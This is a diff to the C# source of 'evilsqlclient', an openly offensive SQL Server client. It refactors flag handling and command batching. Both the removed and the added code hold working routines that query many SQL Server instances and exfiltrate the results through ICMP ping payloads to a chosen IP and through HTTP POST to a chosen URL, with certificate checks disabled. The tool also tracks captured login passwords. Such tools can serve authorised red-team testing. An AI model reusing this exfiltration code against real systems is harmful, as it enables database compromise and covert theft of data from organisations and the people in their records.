@@ -32,25 +32,37 @@ namespace evilsqlclient
         public static void Main(string[] args)
         {
             // Run console
-            if (0 == args.Length) { while (EvilCommands.RunSQLConsole(string.Empty)) { } }
+            if (0 == args.Length) { while (EvilCommands.RunSQLConsole(null)) { } }
 
-            args.ToList().ForEach(i =>
+
+
+            List<List<string>> allCommands = new List<List<string>>();
+            List<string> goList = new List<string>();
+
+            args.ToList()
+                .ForEach( i =>
             {
-#if DEBUG
-                Console.WriteLine($"[D] {i}");
-#endif
-                i.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries).ToList().ForEach(j =>
+                i.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries)
+                 .ToList()
+                 .ForEach( j =>
                 {
-                    try
+                    goList.Add(j);
+                    if (j.Equals("go", StringComparison.OrdinalIgnoreCase))
                     {
-                        EvilCommands.RunSQLConsole(j.Trim());
-                    }
-                    catch (Exception ex) 
-                    {
-                        Console.WriteLine(ex.Message);
-                    }
+                        allCommands.Add(goList);
+                        goList.Clear();
+                    }                    
                 });
             });
+
+            try
+            {
+                allCommands.ForEach(k => EvilCommands.RunSQLConsole(k.ToArray()));
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
         }
 
         public class EvilCommands
@@ -599,7 +611,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -685,7 +697,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -715,7 +727,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -806,7 +818,7 @@ namespace evilsqlclient
                             catch (SqlException ex)
                             {
                                 Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                                if (VerboseG.Equals("enabled"))
+                                if (VerboseG)
                                 {
                                     Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                                 }
@@ -840,7 +852,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -929,7 +941,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -961,7 +973,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1006,7 +1018,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1038,7 +1050,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1101,7 +1113,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1133,7 +1145,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1212,7 +1224,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1242,7 +1254,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1373,7 +1385,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1504,7 +1516,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1665,7 +1677,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1695,7 +1707,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1760,7 +1772,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1788,7 +1800,7 @@ namespace evilsqlclient
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in EvilCommands.MasterDiscoveredList.Select())
                         {
@@ -1922,7 +1934,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1950,7 +1962,7 @@ namespace evilsqlclient
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in EvilCommands.MasterDiscoveredList.Select())
                         {
@@ -2181,7 +2193,7 @@ namespace evilsqlclient
                                     catch (SqlException ex)
                                     {
                                         Console.WriteLine("" + instance + ": LOGIN, CONNECITON, or QUERY FAILED");
-                                        if (VerboseG.Equals("enabled"))
+                                        if (VerboseG)
                                         {
                                             Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                                         }
@@ -2214,7 +2226,7 @@ namespace evilsqlclient
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                     DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -2364,7 +2376,7 @@ namespace evilsqlclient
             public static string CheckQueryReady()
             {
                 // Verify query targets have been defined
-                if ((!InstanceG.Equals("")) || (!ConnectionStringG.Equals("")) || (!InstanceAllG.Equals("disabled")))
+                if ((!ConnectionStringG.Equals("")) || InstanceAllG)
                 {
                     ReadyforQueryG = true;
                 }
@@ -2401,19 +2413,13 @@ namespace evilsqlclient
 
                 return connectionString;
             }
-
-
             #endregion commonfunctions
 
             // --------------------------------
             // FUNCTION: RunConsole / Query 
             // --------------------------------
-            public static bool RunSQLConsole(string commandFromCommandLine)
+            public static bool RunSQLConsole(string[] commandFromCommandLine)
             {
-#if DEBUG
-                Console.WriteLine($"[D] Command: {commandFromCommandLine}");
-#endif
-
                 // Setup columns for discovery table
                 if (MasterDiscoveredList.Columns.Count == 0)
                 {                    
@@ -2442,34 +2448,48 @@ namespace evilsqlclient
                     MasterAccessList.Columns.Add("IsSysadmin");
                     MasterAccessList.Columns.Add("CurrentLoginPassword");
                 }
-
-                // Read line from the client	
-                Console.Write("SQLCLIENT> ");
-
-                bool interactive = true;
+                
+                // Collect multi-line command until "go" is given         
                 string MyQuery = string.Empty;
-                if (string.IsNullOrEmpty(commandFromCommandLine))
-                {
-                    MyQuery = Console.ReadLine();
-                }
-                else
-                {
-                    MyQuery = commandFromCommandLine;
-                    interactive = false;
-                    Console.WriteLine(commandFromCommandLine);
-                }
+                string fullcommand = string.Empty;
 
-                // Collect multi-line command until "go" is given
-                string fullcommand = "";
+                bool multiline = true;
+
+                int i = 0;
                 do
                 {
-                    bool multiline = false;
+                    // Show multi-line input											
+                    if (!multiline)
+                    {
+                        Console.Write("         > ");
+                    }
+                    else
+                    {
+                        Console.Write("SQLCLIENT> ");
+                    }
+
+                    if (null == commandFromCommandLine)
+                    {
+                        MyQuery = Console.ReadLine();
+                    }
+                    else
+                    {
+                        if (commandFromCommandLine.Length > i)
+                        {
+                            MyQuery = commandFromCommandLine[i++];
+                            Console.WriteLine(MyQuery);
+                        }
+                        else
+                        {
+                            break;
+                        }
+                    }
 
                     fullcommand = fullcommand + "\n" + MyQuery;
 
                     // EXIT IF REQUESTED
-                    if (MyQuery.Equals("exit", StringComparison.OrdinalIgnoreCase) 
-                        || MyQuery.Equals("quit", StringComparison.OrdinalIgnoreCase) 
+                    if (MyQuery.Equals("exit", StringComparison.OrdinalIgnoreCase)
+                        || MyQuery.Equals("quit", StringComparison.OrdinalIgnoreCase)
                         || MyQuery.Equals("bye", StringComparison.OrdinalIgnoreCase)
                     )
                     {
@@ -2644,23 +2664,23 @@ namespace evilsqlclient
                         // Unique the list
                         DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                         DataTable distinctValues = AccessView.ToTable(
-                            true, 
-                            "Instance", 
-                            "DomainName", 
-                            "ServiceProcessID", 
-                            "ServiceName", 
-                            "ServiceAccount", 
-                            "AuthenticationMode", 
-                            "ForcedEncryption", 
-                            "Clustered", 
-                            "SQLServerMajorVersion", 
+                            true,
+                            "Instance",
+                            "DomainName",
+                            "ServiceProcessID",
+                            "ServiceName",
+                            "ServiceAccount",
+                            "AuthenticationMode",
+                            "ForcedEncryption",
+                            "Clustered",
+                            "SQLServerMajorVersion",
                             "SQLServerVersionNumber",
-                            "SQLServerEdition", 
-                            "SQLServerServicePack", 
-                            "OSArchitecture", 
-                            "OsVersionNumber", 
-                            "CurrentLogin", 
-                            "CurrentLoginPassword", 
+                            "SQLServerEdition",
+                            "SQLServerServicePack",
+                            "OSArchitecture",
+                            "OsVersionNumber",
+                            "CurrentLogin",
+                            "CurrentLoginPassword",
                             "IsSysadmin"
                         );
 
@@ -2879,265 +2899,255 @@ namespace evilsqlclient
                         Console.WriteLine("----------");
                     }
                     #endregion
-
-                    // Show multi-line input											
-                    if ((MyQuery.ToLower() != "clear") && multiline)
+                    else
                     {
-                        Console.Write("         > ");
-                    }
-
-                    if (interactive)
-                    {
-                        // Collect additional query lines						
-                        MyQuery = Console.ReadLine();
+                        multiline = false;
                     }
                 }
-                while (MyQuery.ToLower() != "go" && interactive);
+                while (MyQuery.ToLower() != "go");
 
                 // ------------------------------------------------------------
                 //  PERFORM QUERY - SINGLE INSTANCE AND TARGETALL SUPPORTED
                 // ------------------------------------------------------------
                 CheckQueryReady();
-                if (ReadyforQueryG)
+                if (!ReadyforQueryG)
                 {
-                    // Create data table 
-                    IList<string> TargetList = new List<string>();
+                    Console.WriteLine("\nNo target instances have been defined.\n");
+                    return true;
+                }
 
+                // Create data table 
+                IList<string> TargetList = new List<string>();
+
+                // Add all
+                if (InstanceAllG)
+                {
                     // Add all
-                    if (InstanceAllG.Equals("enabled"))
+                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
+                    if (InstanceAllG)
                     {
-                        // Add all
-                        // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
-                        if (InstanceAllG.Equals("enabled"))
+                        foreach (DataRow CurrentRecord in EvilCommands.MasterAccessList.Select())
                         {
-                            foreach (DataRow CurrentRecord in EvilCommands.MasterAccessList.Select())
-                            {
-                                TargetList.Add(CurrentRecord["Instance"].ToString());
-                            }
-                        }
-                    }
-
-                    // Add instance
-                    if (!InstanceG.Equals(""))
-                    {
-                        TargetList.Add(InstanceG);
-                    }
-
-                    // Get list count
-                    var count = TargetList.Count;
-                    Console.WriteLine("\n" + count + " instances will be targeted.\n");
-
-                    // Loop through target list 
-                    foreach (var instance in TargetList)
-                    {
-                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
-                        try
-                        {
-
-                            // ----------------------------
-                            // Setup connection string
-                            // ----------------------------
-                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
-
-                            // ----------------------------
-                            // Execute query	
-                            // ----------------------------							
-                            SqlConnection conn = new SqlConnection(ConnectionString);
-                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
-                            conn.Open();
-
-                            // Execute query and read data into data table
-                            DataTable dt = new DataTable();
-                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
-                            da.Fill(dt);
-
-                            // Display results 	
-                            DataRow[] currentRows = dt.Select(null, null, DataViewRowState.CurrentRows);
-                            if (currentRows.Length < 1)
-                            {
-                                Console.WriteLine("\nNo rows returned.\n");
-                            }
-                            else
-                            {
-                                Console.WriteLine("\nQUERY RESULTS:\n");
-
-                                foreach (DataColumn column in dt.Columns)
-                                {
-                                    Console.Write("\t{0}", column.ColumnName);
-                                }
-
-                                Console.WriteLine("\t");
-
-                                foreach (DataRow row in currentRows)
-                                {
-                                    foreach (DataColumn column in dt.Columns)
-                                    {
-                                        Console.Write("\t{0}", row[column]);
-                                    }
-
-                                    Console.WriteLine("\t");
-                                }
-                                Console.WriteLine("\t");
-                            }
-
-                            // ----------------------------
-                            // Encrypt data
-                            // ----------------------------
-                            if (EncStateG.Equals("enabled"))
-                            {
-                                Console.WriteLine("\nEncrypting data.");
-                                // encrypt exfil encryption
-                                //string enableEncryption = "false";
-                                //string mySharedSecret = "changethis";
-                                //string encrypted64 = EncryptStringAES(fileContent.ToString(), EncKeyG);	
-                            }
-
-                            // ----------------------------
-                            // Exfiltrate data to file
-                            // ----------------------------
-                            if (ExportFileStateG.Equals("enabled"))
-                            {
-                                StringBuilder fileContent = new StringBuilder();
-
-                                foreach (var col in dt.Columns)
-                                {
-                                    fileContent.Append(col.ToString() + ",");
-                                }
-
-                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                foreach (DataRow dr in dt.Rows)
-                                {
-                                    foreach (var column in dr.ItemArray)
-                                    {
-                                        fileContent.Append("\"" + column.ToString() + "\",");
-                                    }
-
-                                    fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                }
-
-                                try
-                                {
-                                    // write file output
-                                    System.IO.File.AppendAllText(ExportFilePathG, fileContent.ToString());
-                                    Console.WriteLine("\nSuccessfully wrote file to " + ExportFilePathG + "\n");
-                                }
-                                catch
-                                {
-                                    Console.WriteLine("\nUnable to write file.\n");
-                                }
-                            }
-
-                            // ----------------------------
-                            // Exfiltrate data to icmp
-                            // ----------------------------
-                            if (IcmpStateG.Equals("enabled"))
-                            {
-                                Console.WriteLine("Exfiltrating results via ICMP to: " + IcmpIpG + "\n");
-
-                                // Create content to send
-                                StringBuilder fileContent = new StringBuilder();
-
-                                foreach (var col in dt.Columns)
-                                {
-                                    fileContent.Append(col.ToString() + ",");
-                                }
-
-                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                foreach (DataRow dr in dt.Rows)
-                                {
-                                    foreach (var column in dr.ItemArray)
-                                    {
-                                        fileContent.Append("\"" + column.ToString() + "\",");
-                                    }
-
-                                    fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                }
-
-
-                                // Create string to be sent in ICMP payload
-                                string data = fileContent.ToString();
-
-                                // Source: https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
-                                Ping pingSender = new Ping();
-                                PingOptions options = new PingOptions();
-
-                                // Use the default Ttl value which is 128, but change the fragmentation behavior.
-                                int timeout = 120;
-                                options.DontFragment = true;
-
-                                // Create a buffer of data to be transmitted.
-                                byte[] buffer = Encoding.ASCII.GetBytes(data);
-                                PingReply reply = pingSender.Send(IcmpIpG, timeout, buffer, options);
-                                Console.WriteLine("ICMP exfiltration is complete.\n");
-                            }
-
-                            // ----------------------------
-                            // Exfiltrate data to http post
-                            // ----------------------------
-                            if (HttpStateG.Equals("enabled"))
-                            {
-                                Console.WriteLine("Exfiltrating results to URL: " + HttpUrlG + "\n");
-
-                                // Create content to send
-                                StringBuilder fileContent = new StringBuilder();
-
-                                foreach (var col in dt.Columns)
-                                {
-                                    fileContent.Append(col.ToString() + ",");
-                                }
-
-                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                foreach (DataRow dr in dt.Rows)
-                                {
-                                    foreach (var column in dr.ItemArray)
-                                    {
-                                        fileContent.Append("\"" + column.ToString() + "\",");
-                                    }
-
-                                    fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                }
-
-                                // Create string to be sent in ICMP payload
-                                string mydata = fileContent.ToString();
-                                byte[] postArray1 = Encoding.ASCII.GetBytes(mydata);
-
-                                try
-                                {
-                                    // Trust all SSL certs
-                                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-
-                                    // Turn on TLS 1.1 and 1.2 without affecting other protocols:
-                                    ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
-
-                                    // Create webclient and send payload 																							
-                                    WebClient myWebClient1 = new WebClient();
-                                    myWebClient1.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                                    byte[] responseArray1 = myWebClient1.UploadData(HttpUrlG, "POST", postArray1);
-                                    //Console.WriteLine("\nResponse received was :{0}", Encoding.ASCII.GetString(responseArray1));		
-                                }
-                                catch
-                                {
-                                    // catch(System.Net.WebException ex1)
-                                    // Console.WriteLine("HTTP POST FAILED: " + ex1.Message + "\n");									
-                                }
-
-                                Console.WriteLine("Exfiltration complete.\n");
-                            }
-
-                        }
-                        catch (SqlException ex)
-                        {
-                            Console.WriteLine(instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
-                            {
-                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
-                            }
+                            TargetList.Add(CurrentRecord["Instance"].ToString());
                         }
                     }
                 }
-                else
+
+                // Add instance
+                if (!string.IsNullOrEmpty(InstanceG))
                 {
-                    Console.WriteLine("\nNo target instances have been defined.\n");
+                    TargetList.Add(InstanceG);
+                }
+
+                // Get list count
+                var count = TargetList.Count;
+                Console.WriteLine("\n" + count + " instances will be targeted.\n");
+
+                // Loop through target list 
+                foreach (var instance in TargetList)
+                {
+                    Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
+                    try
+                    {
+                        // ----------------------------
+                        // Setup connection string
+                        // ----------------------------
+                        string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
+
+                        // ----------------------------
+                        // Execute query	
+                        // ----------------------------							
+                        SqlConnection conn = new SqlConnection(ConnectionString);
+                        SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
+                        conn.Open();
+
+                        // Execute query and read data into data table
+                        DataTable dt = new DataTable();
+                        SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
+                        da.Fill(dt);
+
+                        // Display results 	
+                        DataRow[] currentRows = dt.Select(null, null, DataViewRowState.CurrentRows);
+                        if (currentRows.Length < 1)
+                        {
+                            Console.WriteLine("\nNo rows returned.\n");
+                        }
+                        else
+                        {
+                            Console.WriteLine("\nQUERY RESULTS:\n");
+
+                            foreach (DataColumn column in dt.Columns)
+                            {
+                                Console.Write("\t{0}", column.ColumnName);
+                            }
+
+                            Console.WriteLine("\t");
+
+                            foreach (DataRow row in currentRows)
+                            {
+                                foreach (DataColumn column in dt.Columns)
+                                {
+                                    Console.Write("\t{0}", row[column]);
+                                }
+
+                                Console.WriteLine("\t");
+                            }
+                            Console.WriteLine("\t");
+                        }
+
+                        // ----------------------------
+                        // Encrypt data
+                        // ----------------------------
+                        if (EncStateG)
+                        {
+                            Console.WriteLine("\nEncrypting data.");
+                            // encrypt exfil encryption
+                            //string enableEncryption = "false";
+                            //string mySharedSecret = "changethis";
+                            //string encrypted64 = EncryptStringAES(fileContent.ToString(), EncKeyG);	
+                        }
+
+                        // ----------------------------
+                        // Exfiltrate data to file
+                        // ----------------------------
+                        if (ExportFileStateG)
+                        {
+                            StringBuilder fileContent = new StringBuilder();
+
+                            foreach (var col in dt.Columns)
+                            {
+                                fileContent.Append(col.ToString() + ",");
+                            }
+
+                            fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
+                            foreach (DataRow dr in dt.Rows)
+                            {
+                                foreach (var column in dr.ItemArray)
+                                {
+                                    fileContent.Append("\"" + column.ToString() + "\",");
+                                }
+
+                                fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
+                            }
+
+                            try
+                            {
+                                // write file output
+                                File.AppendAllText(ExportFilePathG, fileContent.ToString());
+                                Console.WriteLine("\nSuccessfully wrote file to " + ExportFilePathG + "\n");
+                            }
+                            catch
+                            {
+                                Console.WriteLine("\nUnable to write file.\n");
+                            }
+                        }
+
+                        // ----------------------------
+                        // Exfiltrate data to icmp
+                        // ----------------------------
+                        if (IcmpStateG)
+                        {
+                            Console.WriteLine("Exfiltrating results via ICMP to: " + IcmpIpG + "\n");
+
+                            // Create content to send
+                            StringBuilder fileContent = new StringBuilder();
+
+                            foreach (var col in dt.Columns)
+                            {
+                                fileContent.Append(col.ToString() + ",");
+                            }
+
+                            fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
+                            foreach (DataRow dr in dt.Rows)
+                            {
+                                foreach (var column in dr.ItemArray)
+                                {
+                                    fileContent.Append("\"" + column.ToString() + "\",");
+                                }
+
+                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
+                            }
+
+
+                            // Create string to be sent in ICMP payload
+                            string data = fileContent.ToString();
+
+                            // Source: https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
+                            Ping pingSender = new Ping();
+                            PingOptions options = new PingOptions();
+
+                            // Use the default Ttl value which is 128, but change the fragmentation behavior.
+                            int timeout = 120;
+                            options.DontFragment = true;
+
+                            // Create a buffer of data to be transmitted.
+                            byte[] buffer = Encoding.ASCII.GetBytes(data);
+                            PingReply reply = pingSender.Send(IcmpIpG, timeout, buffer, options);
+                            Console.WriteLine("ICMP exfiltration is complete.\n");
+                        }
+
+                        // ----------------------------
+                        // Exfiltrate data to http post
+                        // ----------------------------
+                        if (HttpStateG)
+                        {
+                            Console.WriteLine("Exfiltrating results to URL: " + HttpUrlG + "\n");
+
+                            // Create content to send
+                            StringBuilder fileContent = new StringBuilder();
+
+                            foreach (var col in dt.Columns)
+                            {
+                                fileContent.Append(col.ToString() + ",");
+                            }
+
+                            fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
+                            foreach (DataRow dr in dt.Rows)
+                            {
+                                foreach (var column in dr.ItemArray)
+                                {
+                                    fileContent.Append("\"" + column.ToString() + "\",");
+                                }
+
+                                fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
+                            }
+
+                            // Create string to be sent in ICMP payload
+                            string mydata = fileContent.ToString();
+                            byte[] postArray1 = Encoding.ASCII.GetBytes(mydata);
+
+                            try
+                            {
+                                // Trust all SSL certs
+                                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+
+                                // Turn on TLS 1.1 and 1.2 without affecting other protocols:
+                                ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+
+                                // Create webclient and send payload 																							
+                                WebClient myWebClient1 = new WebClient();
+                                myWebClient1.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
+                                byte[] responseArray1 = myWebClient1.UploadData(HttpUrlG, "POST", postArray1);
+                                //Console.WriteLine("\nResponse received was :{0}", Encoding.ASCII.GetString(responseArray1));		
+                            }
+                            catch
+                            {
+                                // catch(System.Net.WebException ex1)
+                                // Console.WriteLine("HTTP POST FAILED: " + ex1.Message + "\n");									
+                            }
+
+                            Console.WriteLine("Exfiltration complete.\n");
+                        }
+
+                    }
+                    catch (SqlException ex)
+                    {
+                        Console.WriteLine(instance + ": CONNECTION OR QUERY FAILED");
+                        if (VerboseG)
+                        {
+                            Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
+                        }
+                    }
                 }
 
                 // Return to console 
